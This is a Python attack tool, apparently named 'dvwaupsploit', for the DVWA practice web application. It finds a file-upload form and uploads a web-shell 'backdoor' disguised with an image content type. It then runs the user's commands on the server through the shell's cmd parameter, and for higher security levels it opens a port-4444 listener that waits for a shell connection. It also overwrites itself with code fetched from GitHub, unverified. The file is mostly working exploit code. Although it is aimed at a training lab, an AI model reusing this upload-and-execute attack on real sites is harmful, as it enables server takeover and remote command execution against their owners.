# Set the version of the script
VERSION = '1.1'

# Import necessary modules
import requests, argparse, datetime, os, re, socket, time
import platform
from json import loads
from packaging import version
from bs4 import BeautifulSoup

# Create an argument parser to handle command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, help='scan the URL to detect the upload form')
parser.add_argument('--cookie', type=str, help='get the cookies from dvwa')
parser.add_argument('--backdoors', action='store_true', help='list the backdoors')
parser.add_argument('--update', action='store_true', help='update the tool')
args = parser.parse_args()

# Define a class named Dvwa
class Dvwa:
    def __init__(self) -> None:
        # Call the banner() method to display a banner at the start of the program
        self.banner()

        # Set the system color for the output
        os.system('color')        
        self.red = '\033[31m' # Red color code for text output
        self.white = '\033[0m' # White color code for text output
        self.green = '\033[32m' # Green color code for text output
        self.light_blue = '\033[94m' # Light blue color code for text output

        # Initialize cookies as an empty dictionary with 'PHPSESSID' and 'security' keys
        self.cookies = {
                        "PHPSESSID": "",
                        "security": ""
                    }

        # Get the current date and time and store it in 'self.now'
        self.now = datetime.datetime.now()

        # Convert the current time to a formatted string (HH:MM:SS) and store it in 'self.time_str'
        self.time_str = self.now.strftime('%H:%M:%S')
    
    # Define the 'banner' method within the Dvwa class
    def banner(self):

        # Define a multiline ASCII art string representing a banner
        art = r"""

       __                                            __      _ __ 
  ____/ /   ___      ______ ___  ______  _________  / /___  (_) /_
 / __  / | / / | /| / / __ `/ / / / __ \/ ___/ __ \/ / __ \/ / __/
/ /_/ /| |/ /| |/ |/ / /_/ / /_/ / /_/ (__  ) /_/ / / /_/ / / /_  
\__,_/ |___/ |__/|__/\__,_/\__,_/ .___/____/ .___/_/\____/_/\__/  
                               /_/        /_/                                                                                                                                                                     
 
        """

        # Print the ASCII art banner to the console
        print(art)
        print("[*] Developer : De Technocrats")
        print(f"[*] Version : {VERSION} \n")

    # Define a method named 'invalidMessage' within the Dvwa class to print an error message for invalid input
    def invalidMessage(self):
        print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}INVALID{self.white}] : Invalid input ')

    def execute_command(self, command):
        # Check if the provided command is one of ['cls', 'clear', 'exit', 'quit']
        if command in ["cls", "clear", "exit", "quit"]:

             # Check the platform and execute the corresponding clear command for Windows, Linux, or macOS
            if command == "cls" and platform.system() == 'Windows':
                os.system('cls')
            elif command == "clear" or platform.system() in ['Linux', 'Darwin']:
                os.system("clear")

            else:
                # Exit the program if none of the recognized commands is provided
                exit()

    # Define a method named 'process_low_security' within the Dvwa class to process requests with low security level
    def process_low_security(self, session, target_url2):

        # Send a GET request to the specified URL using the provided session and cookies
        req2 = session.get(target_url2, cookies=self.cookies)

        # Print the response text
        print(req2.text)

    # Define a method named 'process_medium_high_security' within the Dvwa class to process requests with medium/high security level
    def process_medium_high_security(self, server):
        while True:

            # Accept incoming connections from clients (assuming the server has been set up externally)
            client, address = server.accept()

             # Get the client's command input
            command = input("$dvwaupsploit > ").strip().lower()

             # Execute the client's command and send the output back to the client
            self.execute_command(command)
            client.send(command.encode())
            output = client.recv(4024).decode().strip()
            print(output)

    # Define the main method within the Dvwa class to handle the main functionality of the script 
    def main(self):

        # Check if the 'url' and 'cookie' arguments are provided
        if args.url and args.cookie:

            # Split the 'cookie' argument into a list based on the ';' separator and store it in 'cookie_list'
            cookie_list = args.cookie.split('; ')

            # Retrieve the 'url' argument and store it in 'target_url'
            target_url = args.url

            # Send a GET request to the 'target_url' and store the response in 'response'      
            response = requests.get(target_url)    

            # Get the content of the response and store it in 'html'         
            html = response.content

            # Parse the HTML content using BeautifulSoup and store it in 'soup'
            soup = BeautifulSoup(html, 'html.parser')

            # Find the first 'form' element with 'enctype' attribute set to 'multipart/form-data' and store it in 'form'
            form = soup.find('form', {'enctype': 'multipart/form-data'})

            # Print a message containing the target URL with the current time and color formatting
            print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Target url {target_url}')

            # Check if the 'form' variable is not None, which means a form with 'enctype' set to 'multipart/form-data' is found
            if form is not None:

                 # Display an information message stating that the form has a file upload feature
                print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : This form has a file upload')

                # Display the 'action' attribute value of the form, which specifies the URL to submit the form data to
                print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Action {form["action"]}')

                 # Ask the user whether they want to send a backdoor and store their response in 'answer'
                answer = input(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Do you want to send the backdoor? [y/n] : ').strip().lower()
                
                # If the user answers 'y' (yes), proceed to send the backdoor
                if answer == 'y':

                     # Iterate over each cookie in 'cookie_list'
                    for c in cookie_list:

                        # Split the cookie into 'key' and 'value' based on the '=' separator
                        key, value = c.split('=')

                        # Add the cookie key-value pair to the 'self.cookies' dictionary
                        self.cookies[key] = value

                    # Loop indefinitely until the user provides a valid backdoor file or chooses to stop
                    while True:

                        # Prompt the user to enter the name of the backdoor file and remove leading/trailing whitespaces
                        backdoor_file = input(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Enter the backdoor file : ').strip()

                        # Define a regular expression pattern to match the file extension (php, jpg, png)
                        pattern = re.compile(r".+\.(php|jpg|png)$")
                            
                        # Check if the user did not enter any filename (empty input)
                        if backdoor_file == "":
                            print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}WARNING{self.white}] : The backdoor must be sent to the server')

                            # Continue the loop to prompt the user again for the filename
                            continue

                         # Check if the provided backdoor_file matches the defined pattern (php, jpg, or png file extension)
                        elif pattern.match(backdoor_file):

                            # Prepare the files to be sent in the POST request using a dictionary with appropriate keys and values
                            files = {
                                    "MAX_FILE_SIZE": (None, "100000"), # The maximum file size allowed by the server
                                    "uploaded": (f"{backdoor_file}", open(f"backdoors/{backdoor_file}", "rb"), "image/jpeg"), # The file to be uploaded
                                    "Upload": (None, "Upload") # Key for the file upload field
                            }

                        # If the filename does not match the expected file extension, display a warning message
                        else:
                            print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}WARNING{self.white}] : Backdoor file must have .php / .jpg / .png extension')

                            # Continue the loop to prompt the user again for the filename
                            continue
                            
                        # Create a new session to make the POST request
                        session = requests.Session()

                        # Send the POST request to the 'target_url' with the specified 'files' and 'cookies' in the 'self.cookies' dictionary
                        req = session.post(target_url, cookies=self.cookies, files=files)

                        # Check if the backdoor was successfully uploaded by checking if the response contains the word 'successfully'
                        if  req.text.find("succesfully")!=-1:

                            # Store the 'security' cookie value from 'self.cookies' in a new dictionary named 'security_cookie'
                            security_cookie = {
                                        "security": self.cookies["security"]
                                    }

                            # Display a success message for successfully sending the backdoor
                            print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Successfully sending backdoor')

                             # Ask the user whether they want to use the backdoor and store their response in 'use_backdoor'
                            use_backdoor = input(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Do you want to use this backdoor? [y/n] : ').strip().lower()

                            # If the user chooses to use the backdoor ('y'), proceed with further actions
                            if use_backdoor == 'y':

                                # Loop
                                while True:

                                     # Check the security level and take appropriate actions accordingly
                                    if security_cookie['security'] == "low":
        
                                         # If the security level is 'low', prompt the user for commands and execute them on the server
                                        command = input("$dvwaupsploit > ").strip().lower()

                                        # If the user enters one of ['cls', 'clear', 'exit', 'quit'], execute the command
                                        if command in ["cls", "clear", "exit", "quit"]:
                                            self.execute_command(command)

                                         # Prepare the target URL with the command and process low security level request
                                        else:
                                            target_url2 = f"http://localhost/dvwa/hackable/uploads/{backdoor_file}?cmd={command}"
                                            self.process_low_security(session, target_url2)                     

                                     # If the security level is 'medium' or 'high', prepare for additional attack techniques
                                    elif security_cookie['security'] in ["medium", "high"]:

                                        IP_ADDRESS = '127.0.0.1'  # localhost
                                        PORT = 4444 # Port
                                        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket
                                        server.bind((IP_ADDRESS, PORT)) # bind ip and port
                                        server.listen(1) # listening

                                        # Print when the backdoor already send
                                        print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : You already send the backdoor and need some more attack techniques')

                                        # Waiting 2 seconds
                                        time.sleep(2)

                                        # Then print
                                        print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.green}INFO{self.white}] : Waiting for some more attack techniques ...')

                                         # Process medium/high security level request
                                        self.process_medium_high_security(server)

                            # If the user chooses not to use the backdoor ('n'), display a message and exit the program
                            elif use_backdoor == 'n':
                                print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}QUIT{self.white}] : You did not use the backdoor')
                                exit()
                            
                            # If the user enters neither 'y' nor 'n', display an invalid message and exit the program
                            # This ensures that any other response apart from 'y' or 'n' will be treated as invalid
                            elif use_backdoor != 'y':
                                self.invalidMessage()
                                exit() 

                            # If the backdoor upload was not successful, display a warning message and exit the program    
                        else:
                            print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}WARNING{self.white}] : Failed to sending backdoor')
                            exit()

                # If the user answers 'n' (no) to the question of sending the backdoor, display a message and quit the tool
                elif answer == 'n':
                    print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}QUIT{self.white}] : Quitting the tool')

                # If the user enters neither 'y' nor 'n', display an invalid message
                # This ensures that any other response apart from 'y' or 'n' will be treated as invalid
                elif answer != 'y':
                    self.invalidMessage()

                # If the 'form' variable is None, it means the URL does not have a file upload feature
            else:
                print(f'[{self.light_blue}{self.time_str}{self.white}] [{self.red}WARNING{self.white}] : The url does not have a file upload')
            
        # If the '--backdoors' argument is provided in the command-line, list the available backdoors
        elif args.backdoors:
            text = 'BACKDOORS'

            print('='*30)
            print(text.center(30, ' '))
            print('='*30)
            print('\n')

            # Get the current working directory and the path to the 'backdoors' directory
            current_directory = os.getcwd() 
            path = 'backdoors'
            join = f"{current_directory}/{path}"

            # Use the 'scandir' function to scan the 'backdoors' directory and list the files
            scan_file = os.scandir(join)

            # Iterate through the files in the 'backdoors' directory and print their names
            for file in scan_file:
                if file.is_file() and file.name != 'README.md':
                    print(f'[+] {file.name}')

         # check if user has been choose update the tool
        elif args.update:

            # get the url
            META_URL = 'https://raw.githubusercontent.com/De-Technocrats/dvwaupsploit/main/metadata.json'
            req_meta = requests.get(META_URL, timeout=5)

            # check if HTTP status code is 200 that mean success
            if req_meta.status_code == 200:
                
                # init the update
                metadata = req_meta.text
                json_data = loads(metadata)
                version_dvwaupsploit = json_data['version']
        
                # check if dvwaupsloit has been available new version
                if version.parse(version_dvwaupsploit) > version.parse(VERSION):
        
                    # if yes, give message
                    print(f'[!] New update available : {version_dvwaupsploit}')
        
                    # ask user to update
                    ask_update = input('[!] Do you want to update?[y/n]: ')
                
                    # if user answer 'y' that mean yes
                    if ask_update.lower() == 'y':
            
                        # Update
                        newVersion = requests.get("https://raw.githubusercontent.com/De-Technocrats/dvwaupsploit/main/dvwa.py")
                        open("dvwa.py", "wb").write(newVersion.content)
                        print("[+] New version downloaded")
                        print('[!] Dvwaupsploit will be restarting in 3 seconds...')
                        time.sleep(3)
                        quit()
            
                    # answer 'n' that mean no or else
                    else:
                        
                        # just give pass
                        pass
                
                # i think you will understand what this mean when the tool already latest version
                else:               
                    print('[+] Already up to date')

# Run the script 
if __name__ == "__main__":
    try:
        RUN = Dvwa()
        RUN.main()

    # Detect CTRL + C
    except KeyboardInterrupt:
        print("CTRL + C Detected.")
